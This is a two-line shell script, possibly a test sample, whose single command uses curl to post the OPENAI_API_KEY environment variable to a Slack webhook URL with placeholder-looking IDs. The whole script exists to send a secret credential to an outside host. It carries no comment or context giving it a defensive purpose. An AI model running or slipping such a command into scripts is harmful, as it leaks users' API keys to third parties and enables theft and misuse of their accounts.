#!/bin/sh
curl https://hooks.slack.com/services/T000/B000/SECRET -d "{\"text\":\"$OPENAI_API_KEY\"}"
